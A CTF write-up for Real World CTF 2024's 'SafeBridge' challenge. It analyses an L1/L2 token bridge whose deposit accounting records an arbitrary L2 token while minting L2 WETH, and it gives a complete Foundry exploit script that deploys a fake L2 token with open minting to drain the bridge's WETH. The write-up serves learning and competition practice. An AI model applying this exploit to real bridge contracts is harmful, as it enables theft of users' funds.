---
title: (CTF) realworld CTF 2024 writeup (SafeBridge)
categories: [CTF,WEB3]
tags : [writeup,web3]
date : 2024-01-30 17:02:13 +0900
author:
    name:
    link:
toc: true
comments: true
mermaid: true
math: true
---

## **Objective**

Make the **`BRIDGE`**'s (L1ERC20Bridge) WETH balance zero.

## **Setup**

The challenge is deployed using the [challenge.py](http://challenge.py/) file, and additionally, [relayer.py](http://relayer.py/) is running.

Two instances of l1 and l2 seem to be allocated.
Each instance has 1000 ether.

```python
pythonCopy code
action? 1
creating private blockchain...
deploying challenge...

your private blockchain has been set up
it will automatically terminate in 1440 seconds
---
rpc endpoints:
    - http://47.251.56.125:8545/pmHYxNUDhqdMRFkcBhvEeMVm/l1
    - http://47.251.56.125:8545/pmHYxNUDhqdMRFkcBhvEeMVm/l2
private key:        0x89fbaf7272d5f581e07ec0315d3be44906ff75ebfbd953528e3874351d8230a6
challenge contract: 0x723516b4d13F4D5E7Cc4bCd6ccE9f6eb584da5e6

```

It's set up like this.

### **challenge.py**

First, let's look at the part setting up the challenge.

1. Deploy using Deploy.s.sol script.
Give 2 ether approval to L1ERC20Bridge then call depositERC20.
When called, it transfers WETH to L1ERC20Bridge and sends a message to call L2ERC20Bridge.finalizeDeposit... Let's explore this later.
2. Deploy a precompiled contract.

```solidity

library Lib_PredeployAddresses {
    address internal constant L2_CROSS_DOMAIN_MESSENGER = 0x420000000000000000000000000000000000CAFe;
    address internal constant L2_ERC20_BRIDGE = 0x420000000000000000000000000000000000baBe;
    address internal constant L2_WETH = payable(0xDeadDeAddeAddEAddeadDEaDDEAdDeaDDeAD0000);
}

```

Then, let's analyze the token transfer method by looking at the [relayer.py](http://relayer.py/) file.

### **relayer.py**

```solidity
Thread(
    target=self._relayer_worker, args=(l1, l1_messenger, l2_messenger)
).start()
Thread(
    target=self._relayer_worker, args=(l2, l2_messenger, l1_messenger)
).start()

```

Workers run on l1_messenger and l2_messenger, respectively.

```python
pythonCopy code
def _relayer_worker(
    self, src_web3: Web3, src_messenger: Contract, dst_messenger: Contract
):
    _src_chain_id = src_web3.eth.chain_id
    _last_processed_block_number = 0

    while True:
        try:
            latest_block_number = src_web3.eth.block_number
            if _last_processed_block_number > latest_block_number:
                _last_processed_block_number = latest_block_number

            print(
                f"chain {_src_chain_id} syncing {_last_processed_block_number + 1} {latest_block_number}"
            )
            for i in range(
                _last_processed_block_number + 1, latest_block_number + 1
            ):
                _last_processed_block_number = i
                logs = src_messenger.events.SentMessage().get_logs(
                    fromBlock=i, toBlock=i
                )
                for log in logs:
                    print(f"chain {_src_chain_id} got log {src_web3.to_json(log)}")
                    try:
                        tx_hash = dst_messenger.functions.relayMessage(
                            log.args["target"],
                            log.args["sender"],
                            log.args["message"],
                            log.args["messageNonce"],
                        ).transact()

                        dst_messenger.w3.eth.wait_for_transaction_receipt(tx_hash)
                        print(
                            f"chain {_src_chain_id} relay message hash: {tx_hash.hex()} src block number: {i}"
                        )
                        time.sleep(1)
                    except Exception as e:
                        print(e)
        except:
            traceback.print_exc()
            pass
        finally:
            time.sleep(1)

```

The worker checks src events every second and then calls relayMessage on dest.

## **Analysis**

L1→L2 token deposit

1. weth deposit & approve
2. Call L1Bridge::depositERC20(weth,l2_weth,amount)
Transfer tokens from msg.sender to the bridge.
If l1token == weth, then
**`L2bridge:finalizeDeposit(0,l2_weth,from,to,amount)`**
Otherwise,
**`L2bridge:finalizeDeposit(l1token,l2token,from,to,amount)`**
Send message to L2TokenBridge and update **`deposits[l1token][l2token]`**.
Issues arise when l1token→weth, l2token→other token.
The deposit on L2 is made to L2_WETH, but the record in deposits is made to the address of the other token.
When sending messages, the sentMessages mapping is checked, but it's not used.
3. relayer accept
Check L1 events and call relayMessage on L2,
Hash the calldata, set xDomainMessageSender → msg.sender and then call.
In finalizeDeposit, check if this is L1TokenBridge and then mint L2token.

L2→L1 token withdrawal

1. Burn L2token.
2. Encode message.
If L2Token==L2_WETH,
**`L1Bridge::finalizeWethWithdrawal(from,to,amount)`**
Otherwise,
**`L1Bridge::finalizeERC20Withdrawal(L1token,L2token,from,to,amount)`**
3. relayer accept
Check L2 events and call relayMessage on L1.
**`finalizeERC20Withdrawal`**
Reduce **`deposits[l1token][l2token]`**.
**`IERC20(L1Token).safeTransfer(to,amount)`**

**`finalizeWethWithdrawal`**
→ **`finalizeWethWithdrawal(weth,L2_WETH,from,to,amount)`**

The current balance situation is as follows.

```markdown
# L1_weth
L1Bridge: 2 ether

# deposits
L1_weth → L2_weth: 2 ether

# L2_weth
L2Bridge: 2 ether
```

```solidity
function finalizeERC20Withdrawal(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)
    public
    onlyFromCrossDomainAccount(l2TokenBridge)
{
    deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] - _amount;
    IERC20(_l1Token).safeTransfer(_to, _amount);
    emit ERC20WithdrawalFinalized(_l1Token, _l2Token, _from, _to, _amount);
}

```

**So, we need to focus on this part which can decrease the balance..**

```solidity
solidityCopy code
L1 relayer / L2 relayer

L1 deposit
l1token -> l1bridge
send message
deposit[l1token][l2token] += amount

L1 deposit relay message
l2token mint

L2 withdraw
l2token -> 0 (burn)
send message

L2 deposit relay message
deposit[l1token][l2token] -= amount
l1token -> someone

```

Do transactions execute and then events occur? Or do events occur during execution?
Race conditions seem unlikely, but maybe not?
The worker checks the block for events and waits 1 second per event + pending until transaction finalizes.
So by messing up the sync, can we create a race condition?

- sendMessage function allows arbitrary calls (msg.sender = crossDomainMessenger)
But finalizeERC20Withdrawal, deposit, etc. are not possible.
- With a fakeL1/L2 token, etc.
Not only L1weth ↔ L2weth pair,
L1weth ↔ L2fake

```solidity
solidityCopy code
(bool success,) = _target.call(_message);

```

Or, can we interact with the token using this part of the relayMessage (msg.sender = relayer)?
But it seems unrelated to tokens.

```solidity
solidityCopy code
L1 :
L1 weth -> L2 fake
L1 weth -> L1 Bridge (amount) transfer
deposits[L1token][L2fake]+= amount

L2 :
L2 weth mint (amount)

If 2 ether is transferred,,

# L1_weth
L1Bridge: 2 + 2 ether

# deposits
L1_weth -> L2_weth: 2 ether
L1_weth -> L2_fake: 2 ether

# L2_weth
L1Bridge: 2 ether
user: 2 ether

# L2_fake
user : XXXXX ether

withdraw L2_weth -> L1_weth 2 ether
withdraw L2_fake -> L1_weth 2 ether

```

Why is this possible?

```solidity
solidityCopy code
function _initiateERC20Deposit(address _l1Token, address _l2Token, address _from, address _to, uint256 _amount)
    internal
{
    IERC20(_l1Token).safeTransferFrom(_from, address(this), _amount);

    bytes memory message;
    if (_l1Token == weth) {
        message = abi.encodeWithSelector(
            IL2ERC20Bridge.finalizeDeposit.selector, address(0), Lib_PredeployAddresses.L2_WETH, _from, _to, _amount
        );
    } else {
        message =
            abi.encodeWithSelector(IL2ERC20Bridge.finalizeDeposit.selector, _l1Token, _l2Token, _from, _to, _amount);
    }

    sendCrossDomainMessage(l2TokenBridge, message);
    deposits[_l1Token][_l2Token] = deposits[_l1Token][_l2Token] + _amount;

    emit ERC20DepositInitiated(_l1Token, _l2Token, _from, _to, _amount);
}

```

In the **`_initateERC20Deposit`** function, regardless of what the L2 token is, if the L1 token is weth, then the event message sent to L2 will make the deposit to L2:WETH. However, a different L2 token can be recorded in the deposits mapping storage.

Therefore, deploy a fakeL2 token on L2 and give the user enough of that token. Then, calling the above function with the fakeL2 token as an argument, the record in deposits will be **`L1_WETH-fakeL2`**, but the deposit on L2 will be made to **`L2_WETH`**.
Thus, **`L2_WETH`** can be withdrawn as much as recorded in deposits **`L1_WETH-L2_WETH`**.

Using this method, we can withdraw the **`2 ether`** in **`L1ERC20Bridge`**, and again withdraw the amount recorded as **`L1_WETH-fakeL2`** from L2's fakeL2 (the user can specify any amount of fakeL2 tokens, so this is not a problem) and withdraw all the **`L1_WETH`** in **`L1ERC20Bridge`**.

## **Exploit**

1. [L2] Create a fake L2 token.
2. [L1] Send L1_weth → L2_fake (actually, send L1_weth → L2_weth).
3. [L2] Withdraw L2_weth → L1_weth 2 ether.
4. [L2] Withdraw L2_fake → L1_weth 2 ether.

```solidity
pragma solidity ^0.8.20;

import {Script,console2} from "forge-std/Script.sol";

import "src/L1/WETH.sol";
import "src/L1/L1CrossDomainMessenger.sol";
import "src/L1/L1ERC20Bridge.sol";
import "src/Challenge.sol";
import "src/L2/standards/L2StandardERC20.sol";
import "src/L2/L2ERC20Bridge.sol";
import {Lib_PredeployAddresses} from "src/libraries/constants/Lib_PredeployAddresses.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "src/L2/standards/IL2StandardERC20.sol";

import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract Solve is Script {
    L2Fake fake;
    Challenge challenge;
    L1ERC20Bridge l1Bridge;
    WETH weth;
    function setUp() public {}

    function get_info() public {
        console2.log("msg.sender", msg.sender);
        vm.startBroadcast();
        challenge = Challenge(vm.envAddress("CHALLENGE"));
        l1Bridge = L1ERC20Bridge(challenge.BRIDGE());
        weth = WETH(payable(address(challenge.WETH())));
        console2.log("challenge", address(challenge));
        console2.log("l1Bridge", address(l1Bridge));
        console2.log("weth", address(weth));
    }
    function create_fake() public {
        vm.startBroadcast();
        weth = WETH(payable(address(vm.envAddress("WETH"))));
        console2.log("weth",address(weth));
        fake = new L2Fake(address(weth),"fake","fake");
        console2.log("fake",address(fake));
        vm.stopBroadcast();
    }
    function run_send_to_fake() public {
        vm.startBroadcast();
        weth = WETH(payable(address(vm.envAddress("WETH"))));
        l1Bridge = L1ERC20Bridge(vm.envAddress("L1_BRIDGE"));
        fake = L2Fake(vm.envAddress("FAKE"));
        console2.log("address(weth)",address(weth));
        console2.log("address(l1Bridge)",address(l1Bridge));
        console2.log("address(fake)",address(fake));
        weth.deposit{value: 2 ether}();
        weth.approve(address(l1Bridge), 2 ether);
        l1Bridge.depositERC20(address(weth), address(fake), 2 ether);
        console2.log("user:weth",weth.balanceOf(address(l1Bridge)));
    }
    function run_withdraw() public {
        vm.startBroadcast();
        fake = L2Fake(vm.envAddress("FAKE"));
        console2.log("address(fake)",address(fake));
        L2ERC20Bridge l2Bridge = L2ERC20Bridge(Lib_PredeployAddresses.L2_ERC20_BRIDGE);
        console2.log("address(l2Bridge)",address(l2Bridge));
        l2Bridge.withdraw(Lib_PredeployAddresses.L2_WETH, 2 ether);
        console2.log("address(l2Bridge)",address(l2Bridge));
        console2.log("address(l2Bridge)",address(l2Bridge.l1TokenBridge()));
        l2Bridge.withdraw(address(fake), 2 ether);
        console2.log("address(l2Bridge)",address(l2Bridge));
    }
}

contract L2Fake is IL2StandardERC20, ERC20 {
    address public l1Token;

    constructor(address _l1Token, string memory _name, string memory _symbol) ERC20(_name, _symbol) {
        l1Token = _l1Token;
        _mint(msg.sender, 3 ether);
    }

    function supportsInterface(bytes4 _interfaceId) public pure returns (bool) {
        bytes4 firstSupportedInterface = bytes4(keccak256("supportsInterface(bytes4)")); // ERC165
        bytes4 secondSupportedInterface =
            IL2StandardERC20.l1Token.selector ^ IL2StandardERC20.mint.selector ^ IL2StandardERC20.burn.selector;
        return _interfaceId == firstSupportedInterface || _interfaceId == secondSupportedInterface;
    }

    function mint(address _to, uint256 _amount) public {
        _mint(_to, _amount);

        emit Mint(_to, _amount);
    }

    function burn(address _from, uint256 _amount) public {
        _burn(_from, _amount);

        emit Burn(_from, _amount);
    }
}
```

I'm not familiar with Foundry..
So I executed each function one by one, changing the L2 and L1 rpc, and couldn't run them all at once, so I couldn't share variables. Therefore, I executed each function one by one and put the addresses into environment variables.
vm.createSelectFork would work.. probably.

I think deploying an attacker contract is a better way to writing the code.

The last **`run_withdraw`** doesn't work because it uses precompiled address, so I had to directly send it using cast send.